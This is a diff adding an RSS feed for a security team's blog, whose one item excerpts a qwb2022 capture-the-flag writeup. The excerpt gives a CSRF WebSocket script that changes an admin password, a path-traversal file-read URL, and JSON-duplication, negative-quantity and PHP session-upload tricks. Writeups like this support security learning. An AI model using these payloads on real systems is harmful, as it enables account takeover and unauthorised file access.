@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>qwb on or4nge</title>
+    <link>https://or4ngesec.github.io/tags/qwb/</link>
+    <description>Recent content in qwb on or4nge</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 02 Aug 2022 19:00:00 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/tags/qwb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>qwb2022 Writeup by or4nge</title>
+      <link>https://or4ngesec.github.io/post/qwb2022-writeup-by-or4nge/</link>
+      <pubDate>Tue, 02 Aug 2022 19:00:00 +0800</pubDate>
+      
+      <guid>https://or4ngesec.github.io/post/qwb2022-writeup-by-or4nge/</guid>
+      <description>Web babyweb 任意注册，main 路由下 websocket 可以让管理员访问任意 ip:port，修改密码，在自己 vps 上构造 script 来 csrf：
+&amp;lt;script&amp;gt; var ws = null; var url = &amp;#34;ws://&amp;#34; + &amp;#34;127.0.01:port&amp;#34; + &amp;#34;/bot&amp;#34;; ws = new WebSocket(url); ws.onopen = function (event) { var msg = document.getElementById(&amp;#34;sendbox&amp;#34;).value; ws.send(&amp;#34;changepwd 123456&amp;#34;); } &amp;lt;/script&amp;gt; 修改密码后拿到 hint，后台是个 go，利用 python 和 go 对 json 字段理解不同双鞋相同字段前后绕过，设置购买数量为负数后购买flag即可。
+easyweb http://47.104.95.124:8080/showfile.php?f=./demo/../class.php 任意文件读，审计发现触发 adminShow 的 show 可以 ssrf。 注意到 session 没开启，用 PHP_SESSION_UPLOAD_PROGRESS 强制开启 session_start() 来上传文件：
+POST /index.php HTTP/1.1 Host: 47.</description>
+    </item>
+    
+  </channel>
+</rss>
